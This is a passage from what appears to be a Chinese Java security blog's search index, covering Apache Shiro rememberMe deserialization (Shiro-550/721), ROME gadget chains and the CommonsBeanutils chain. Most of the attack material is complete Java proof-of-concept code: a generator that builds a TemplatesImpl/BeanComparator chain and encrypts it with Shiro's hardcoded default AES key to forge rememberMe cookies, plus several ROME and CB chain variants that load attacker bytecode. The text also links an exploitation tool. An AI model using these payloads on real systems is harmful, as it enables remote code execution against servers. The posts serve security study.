继续朔源看谁调用了 setCipherKey 函数，发现在构造函数中 常量 DEFAULT_CIPHER_KEY_BYTES 就是默认设置的加密 key 了。 至此生成 cookie 的大概过程就清楚了就是序列化+AES 加密+base64 编码。 rememberMe 解密 现在来看看是如何获取 cookie 并进行反序列化的，找到其 base64 解码对应方法 同样查找谁调用了该方法，在 AbstractRememberMeManager#getRememberedPrincipals， 这里就是先调用 getRememberedSerializedIdentity 函数进行 base64 解码后在调用 convertBytesToPrincipals 进行 AES 解密和反序列化， 漏洞利用 知道存在反序列化，那么 payload 生成也就是序列化恶意 poc+AES 加密+base64 加密，然后就可以进行攻击了。由于 shiro 是自带 cb 依赖的，所以可以直接打 cb 链。 构造 poc， package org.apache.shiro.web; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import org.apache.shiro.codec.Base64; import org.apache.shiro.codec.CodecSupport; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class shiroCBtest { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); PriorityQueue queue = new PriorityQueue(1); BeanComparator comparator = new BeanComparator(\"outputProperties\"); queue.add(1); queue.add(1); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); Object[] queue_array = new Object[]{tem,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); String data = serilize(queue); byte[] originalText = Base64.decode(data); // 加密 String encryptedText = encrypt(originalText, SECRET_KEY); System.out.println(\"Encrypted: \" + encryptedText); } public static String encrypt(byte[] data, String secret) throws Exception { AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(CodecSupport.toBytes(\"kPH+bIxk5D2deZiIxcaaaA==\")); ByteSource ciphertext = aes.encrypt(data, key); return ciphertext.toString(); //ByteSource对象的toString()会将字节数据转换成Base64编码的字符串，所以这里不用再额外进行base64编码了，如果想要得到原始字节码可以使用getBytes()方法，然后再进行base64编码。 } public static String serilize(Object obj)throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(obj); byte[] ObjectBytes = out.toByteArray(); String base64EncodedValue = Base64.encodeToString(ObjectBytes); return base64EncodedValue; } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }抓包替换 rememberMe 字段，发包后报错，显示报错和 cc 有关 后面看了组长的视频知道是因为没有 cc 依赖，而 cb 中的 BeanComparator 类构造函数引用了 cc 中的类 ComparableComparator。 可以用它的另一个构造函数，只不过这里需要找一个继承了 Comparator 接口并且继承 Serializable 接口的类， 发现 AttrCompare 类就满足条件。 所以重新构造 package org.apache.shiro.web; import com.sun.org.apache.xalan","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:3","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"Shiro-721 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:0","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"漏洞利用条件 开启 rememberMe 功能； rememberMe 值使用 AES-CBC 模式解密； 能获取到正常 Cookie，即用户正常登录的 Cookie 值；（意思是要先登录一次） 密文可控；（就是 cookie 嘛） ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:1","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"漏洞原理 影响版本：1.2.5 \u003c= Apache Shiro \u003c= 1.4.1 漏洞特征：响应包中包含字段remember=deleteMe字段 Shiro 的RememberMe Cookie使用的是 AES-128-CBC 模式加密。其中 128 表示密钥长度为128位，CBC 代表Cipher Block Chaining，这种AES算法模式的主要特点是将明文分成固定长度的块，然后利用前一个块的密文对当前块的明文进行加密处理。 这种模式的加密方式容易受到 Padding Oracle Attack 的影响。如果填充不正确，程序可能会以不同的方式响应，而不是简单的返回一个错误。然后攻击者可以利用这些差异性响应来逐个解密密文中的块，即使他们没有加密的密钥。 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:2","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"环境搭建 参考：https://github.com/inspiringz/Shiro-721 git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.4.1然后在执行下面命令编译 war 包 cd samples/web mvn install配置 tomcat 和上面一样，只不过 jre 版本改为 1.8，webapps 目录下面选择该 war 包。然后运行结果如下 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:3","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"漏洞分析 其他地方其实和 shiro550 没什么差别，就是在对序列化内容进行编码有所改变，shiro550 是通过固定密钥来进行的加密，其设置密钥函数 而 shiro721 中则是通过动态来生成的密钥， 跟进函数 generateNewKey 看看密钥是怎么生成的。 初始化了 keyBitSize 对象，这里是获得一个随机数发生器SecureRandom 然后调用了 generateKey() 函数 最后 getEncoded 获得了 16 位随机密钥。 但是由于加密用的是 AES-128-CBC 加密模式，可以利用 CBC 翻转进行绕过。 漏洞利用 这里需要利用差异性响应来逐个解密密文中的块，所以这里需要来看解密的不同响应， 当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK） 也就是前面看到的Set-Cookie: rememberMe=deleteMe 当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误） 当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK） 其实总结就是 Padding正确，服务器正常响应 Padding错误，服务器返回Set-Cookie: rememberMe=deleteMe 这里就直接利用工具进行构造了，工具地址：https://github.com/feihong-cs/ShiroExploit-Deprecated ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:4","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"ROME 反序列化 ","date":"2024-07-08","objectID":"/posts/rome/:0:0","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"rome 是什么 ROME是主要用于解析RSS和Atom种子的一个Java框架。 ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。 他有个特殊的位置就是ROME提供了ToStringBean这个类，提供深入的toString方法对Java Bean进行操作。 ","date":"2024-07-08","objectID":"/posts/rome/:1:0","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"环境配置 rome:rome:1.0 jdk8u71 \u003cdependency\u003e \u003cgroupId\u003erome\u003c/groupId\u003e \u003cartifactId\u003erome\u003c/artifactId\u003e \u003cversion\u003e1.0\u003c/version\u003e \u003c/dependency\u003e","date":"2024-07-08","objectID":"/posts/rome/:2:0","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"链子分析 * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap\u003cK,V\u003e.hash(Object) * HashMap\u003cK,V\u003e.readObject(ObjectInputStream)在 ysoserial 给出的链子中以 HashMap.readObject 作为反序列化入口点的。这个就不用多说了，触发 hash，触发 hashcode。然后和 cc6 不同的是触发得是 rome 中 ObjectBean 类的 hashcode， 然后触发EqualsBean.beanHashcode，在去触发 toString 函数，这个 _obj 可以通过构造函数进行控制。 跟着来到 ObjectBean 的 toString 方法： 发现调用了 toStringBean 的 toString 方法，跟进 通过旁边的注释也不难看出就是在通过反射调用 getter 方法。具体怎么回事呢，先跟进 getPropertyDescriptors 看看 看见在满足 if 条件后，先执行了 getPDs 方法，这个方法又干了什么？ 就是获得 class 的 getter 和 setter 方法。 然后回到上面的 getPropertyDescriptors 方法，在获得 getter 和 setter 方法后调用了 _introspected.put 处理。_introspected 就是上面的 hashmap 对象。意思就是调用了 hashmap 的 put 方法把方法存进了 map 中，然后在 ToStringBean. toString 进行遍历 map 。 说起调用 getter 方法去加载字节码，和 CB 链思路很像。所以这里就是 ToStringBean. toString 去触发TemplatesImpl.getOutputProperties方法来加载字节码 ","date":"2024-07-08","objectID":"/posts/rome/:3:0","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"poc 编写 先把 objectBean 进行实列化，待会调用其 hashcode 方法，看看其构造函数 然后需要的是 hashcoed 去触发 equalsBean.beanHashCode()， 这里可以跳过调用 objectBean. toString，直接调用 ToStringBean. toString 方法。所以需要_obj 为 ToStringBean 对象，这里的 obj 也就是 objectBean 构造函数中的 obj，至于另一个参数 beanClass 就不用管了。 ObjectBean bean = new ObjectBean(ToStringBean.class,tobean);然后在这之前就是 ToStringBean 对象的编写。来到其 toString 方法， 我们想要的是 TemplatesImpl 中的 getOutputProperties () 方法。但是上面说了会对所有的 getter 方法进行遍历，而 TemplatesImpl 有很多的 getter 方法，所以这里可以把 _beanClass 设置为其接口类 Templates.class，它里面只有这一个 getter 方法。 所以 ToStringBean tobean = new ToStringBean(Templates.class,tem);剩下的前面触发 hashcode 方法就照着 cc6 写，后面动态类加载字节码可以照着 cb 链写。 然后至于解决 put 提前触发的问题可以把 ToStringBean 对象改为 ToStringBean tobean = new ToStringBean(Templates.class,);在 put 过后利用反射修改 _obj 的值 Field v = tobean.getClass().getDeclaredField(\"_obj\"); v.setAccessible(true); v.set(tobean, tem);最后 poc package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.lang.reflect.Field; public class Rome { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); ToStringBean tobean = new ToStringBean(Templates.class,new ConstantTransformer(1)); ObjectBean bean = new ObjectBean(ToStringBean.class,tobean); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(bean,\"gaoren\"); Field v = tobean.getClass().getDeclaredField(\"_obj\"); v.setAccessible(true); v.set(tobean, tem); serilize(hashmap); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }","date":"2024-07-08","objectID":"/posts/rome/:4:0","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"番外 上面的 poc 是照着 ysoserial 中的链子写的，事实上 poc 还有很多。 ","date":"2024-07-08","objectID":"/posts/rome/:5:0","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"BadAttributeValueExpException 上面看到最后想要调用的是 toString 方法，这和 cc5 很像，cc5 最后也是调用 TiedMapEntry.toString 方法去触发 getValue 方法。 所以这里利用 BadAttributeValueExpException.readobject 方法来触发 ToStringBean.tostring 方法， 直接照搬前面的 cc5 BadAttributeValueExpException val = new BadAttributeValueExpException(null); ObjectBean bean = new ObjectBean(Templates.class, tem); Field v = val.getClass().getDeclaredField(\"val\"); v.setAccessible(true); v.set(val, bean);poc package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ObjectBean; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.lang.reflect.Field; public class Rome { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); BadAttributeValueExpException val = new BadAttributeValueExpException(null); ObjectBean bean = new ObjectBean(Templates.class, tem); Field v = val.getClass().getDeclaredField(\"val\"); v.setAccessible(true); v.set(val, bean); serilize(val); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }","date":"2024-07-08","objectID":"/posts/rome/:5:1","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"EqualsBean EqualsBean 也有 hashcode 方法 所以和原本的 rome 没什么区别，就是把 hash 触发 objectbean. hashcode 改为 equalsbean. hashcode。 poc package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.lang.reflect.Field; public class Rome { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); ToStringBean tobean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equal = new EqualsBean(ToStringBean.class,tobean); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(equal,\"gaoren\"); Field v = tobean.getClass().getDeclaredField(\"_obj\"); v.setAccessible(true); v.set(tobean, tem); serilize(hashmap); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }","date":"2024-07-08","objectID":"/posts/rome/:5:2","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"hashset 这个就是把开头触发 hashcode 换为了 cc6 另外一条。 hashset.readobject 中的 put 方法可以触发。这个也照着拼接就行了。 poc package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.lang.reflect.Field; import java.util.HashSet; public class Rome { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); ToStringBean tobean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equal = new EqualsBean(ToStringBean.class,tobean); HashSet set=new HashSet(); set.add(equal); Field v = tobean.getClass().getDeclaredField(\"_obj\"); v.setAccessible(true); v.set(tobean, tem); serilize(set); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }","date":"2024-07-08","objectID":"/posts/rome/:5:3","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"ObjectBean#equals 看了 nivia 师傅的文章，发现 ObjectBean.equals 也可以实现利用链，跟进 看见调用了 beanEquals，跟进后发现也有调用 getter 函数。 后面的就不用多说什么了，回忆一下前面是怎么触发到 equals 的。通过 hashtable.readobject 触发 reconstitutionPut 方法，然后两次 hash 比较相同后调用 equals 方法。最终会触发HashMap的equals方法，由于HashMap没有实现equals方法，会调用AbstructMap 类的equals方法。 这里看到又会调用 equals 方法，在原本的 cc7 中我们想要的就只是调用 m.get 函数，而这里可以通过控制 value 的值来调用到 ObjectBean 的 equals 方法。然后调用到 beanEquals 方法，但是最后要成功调用 getter 方法需要满足一些条件 看到要 bean1 和 bean2 不为空。还需要满足 if (!_beanClass.isInstance(bean2))这里就是判断 bean2 是否是 _beanClass 类的或其子类的实例。由后面调用 getter 不难看出 _beanClass 是 equalsbean 类。 现在我们要做的就是让 bean2 满足条件就行，朔源发现 bean2 就是 AbstructMap 类 equals 方法中的 m.get(key)。m.get (key) 就是获取 hashmap 中 key 对应的 value 值。 然后就是我们还需要控制 value.equals(m.get(key)) 中的 value 值，让其为 objectbean 对象或者 equalsbean 对象（equalsbean 里面也有 equals 方法，同样可以直接触发 beanEquals 方法）。现在就是需要两个 value 值，一个为 TemplatesImpl 对象一个为 equalsbean 对象，所以这里需要两个 hashmap，先构造 payload 在分析吧 package org.example; .xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.interna import com.sun.org.apache.xalan.internall.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Hashtable; import java.lang.reflect.Field; public class Rome { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); EqualsBean bean = new EqualsBean(String.class, \"gaoren\"); HashMap hashMap1 = new HashMap(); hashMap1.put(\"yy\", bean); hashMap1.put(\"zZ\", tem); HashMap hashMap2 = new HashMap(); hashMap2.put(\"yy\", tem); hashMap2.put(\"zZ\", bean); Hashtable table = new Hashtable(); table.put(hashMap1, \"1\"); table.put(hashMap2, \"2\"); setValue(bean, \"_beanClass\", Templates.class); setValue(bean, \"_obj\", tem); serilize(table); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }其他的都很好理解，可以看到这里 hashmap 里面传了两个键值对，先来分析其 hashcode 为什么相等。 跟进 hashcode 函数，发现其是计算的 hashmap 中键值对的 hash 值进行相加， 键值对的 hash 值又是如何计算的，继续看 可以看到是键 hash 加值 hash。所以这里 hashmap1 和 hashmap2 只是调换了键值对的顺序其 hash 相加还是相等的。因为在 hashtable 的 readobject 中进行判断时，hashmap1 和 hashmap2 都只是键。 然后就是关键的为什么要放两个键值对。 e 是 table 中的 hashmap，也就是 hashmap1，然后 key 是 hashmap2 中的键。然后继续跟进到 AbstractMap 的 equals 中。 i 是遍历的 hashmap 值，这个 hashmap 是调用该方法的 hashmap ，也就是 hashmap1。而 m 是 hashmap2。所以这里的 value 就是 equalsbean 对象，而 m.get (key) 就是 TemplatesImpl。最后反射修改值，调用 getter 方法。 当然还有一些可以和其他的结合的就太多了。 参考：https://xz.aliyun.com/t/12768 参考：https://nivi4.notion.site/ROME-5b10d8b72e6d400aaec4722039b6c9ea ","date":"2024-07-08","objectID":"/posts/rome/:5:4","tags":["java","反序列化"],"title":"ROME 反序列化","uri":"/posts/rome/"},{"categories":["javasec"],"content":"CB链分析与利用 gadget: PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() BeanComparator.compare() //cb依赖特有 PropertyUtils.getProperty() //cb依赖特有 TemplatesImpl.getOutputProperties() TransformerImpl.newTransformer() TransformerImpl.getTransletInstance() TransformerImpl.defineTransletClasses() TransformerImpl.defineclass()","date":"2024-07-01","objectID":"/posts/cb/:0:0","tags":["java","反序列化"],"title":"CB链分析与利用","uri":"/posts/cb/"},{"categories":["javasec"],"content":"环境配置 commons-beanutils 1.8.3 commons-logging:commons-logging:1.2 jdk 8u71pom.xml 添加 \u003cdependency\u003e \u003cgroupId\u003ecommons-beanutils\u003c/groupId\u003e \u003cartifactId\u003ecommons-beanutils\u003c/artifactId\u003e \u003cversion\u003e1.8.3\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-logging\u003c/groupId\u003e \u003cartifactId\u003ecommons-logging\u003c/artifactId\u003e \u003cversion\u003e1.2\u003c/version\u003e \u003c/dependency\u003eApache Commons Beanutils是Apache Common下的一个工具集下的另一个项目，提供对普通Java类对象（JavaBean）的一些操作方法 JavaBean 是一种JAVA语言写成的可重用组件,它是一个类。 所谓javaBean，是指符合如下标准的Java类： 类是公共的 有一个无参的公共的构造器 有私有属性，且须有对应的get、set方法去设置属性 对于boolean类型的成员变量，允许使用\"is\"代替上面的\"get\"和\"set\" 在java中，有很多类定义都符合这样的规范。一个简单的 javaBean： package org.example; public class Main{ private String name = \"GRYS\"; private int age; public String getName(){ return name; } public void setName(String name){ this.name = name; } public boolean isChild() { return age \u003c= 18; } }在 CB 中有个工具类叫 PropertyUtils，它可以对 javaBean 进行一些操作 PropertyUtils 类下提供了一些静态方法，以方便开发者直接调用一些getter和setter方法： getProperty：返回指定Bean的指定属性的值 getSimpleProperty：返回指定Bean的指定属性的值 setProperty：设置指定Bean的指定属性的值 setSimpleProperty：设置指定Bean的指定属性的值 package org.example; import org.apache.commons.beanutils.PropertyUtils; import java.io.IOException; public class CBtest{ public static void main(String[] args)throws Exception { CBtest cb = new CBtest(); cb.setName(\"gaoren\"); String name1 = (String) PropertyUtils.getProperty(cb, \"name\"); PropertyUtils.setProperty(cb, \"name\",\"yusi\"); String name2 = (String) PropertyUtils.getProperty(cb, \"name\"); System.out.println(name1); System.out.println(name2); } private String name = \"GRYS\"; private int age; public String getName(){ return name; } public void setName(String name){ this.name = name; } public boolean isChild() { return age \u003c= 6; } } 这里用到的 getProperty 和 setProperty 实际上就是调用的 javaBean 中的 getter 和 setter 方法 ","date":"2024-07-01","objectID":"/posts/cb/:1:0","tags":["java","反序列化"],"title":"CB链分析与利用","uri":"/posts/cb/"},{"categories":["javasec"],"content":"CB 链分析 在 cc2 的基础上，cb 链寻找了个新的 compare 进行利用。在 ysoserial 中给出了最后利用的是 BeanComparator.compare() 函数，前面部分和 cc2 没有什么区别。 跟进到 BeanComparator.compare() 函数， 可以看到在不满足property == null 条件后会调用 PropertyUtils.getProperty，这个我们上面说了可以调用 javaBean 的 getter 函数。 接着看，在 ysoserial 中利用其来调用了 Temlatesimpl.getOutputProperties() 方法也就是 _outputProperties 属性的 getter 方法，之前学了 Temlatesimpl 动态加载字节码，知道 getOutputProperties() 函数可以层层触发实现该目的。 所以这里让 o1 为 templates 对象，然后 property 为TemplatesImpl的 _outputProperties 属性，即可调用 TemplatesImpl.getOutputProperties() ，最后就可以进行动态加载字节码了。 ","date":"2024-07-01","objectID":"/posts/cb/:2:0","tags":["java","反序列化"],"title":"CB链分析与利用","uri":"/posts/cb/"},{"categories":["javasec"],"content":"poc 编写 先实例化 BeanComparator 对象，看其构造函数 我们要让 property 为 outputProperties 属性，这样调用的 getter 函数才是 getOutputProperties()，所以： BeanComparator comparator = new BeanComparator(\"outputProperties\");在 ysoserial 是先调用的无参构造函数，然后通过反射修改的 property 属性 BeanComparator comparator = new BeanComparator(); setFieldValue(comparator, \"property\", \"outputProperties\");和 cc2 不同的是因为 cc2 最后是直接由 compare 调用的 transform 方法，而这里是通过 compare 去调用 getter 方法，所以还要控制 compare 方法的参数。 溯源 o1，发现就是传入的 queue 数组，反射修改值 Object[] queue_array = new Object[]{tem,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array);最后前面照搬 cc2，后面 comparator 那里换一下就 ok 了， 最终 poc package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.comparators.TransformingComparator; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CBtest { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); PriorityQueue queue = new PriorityQueue(1); BeanComparator comparator = new BeanComparator(\"outputProperties\"); queue.add(1); queue.add(1); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); Object[] queue_array = new Object[]{tem,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); serilize(queue); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String 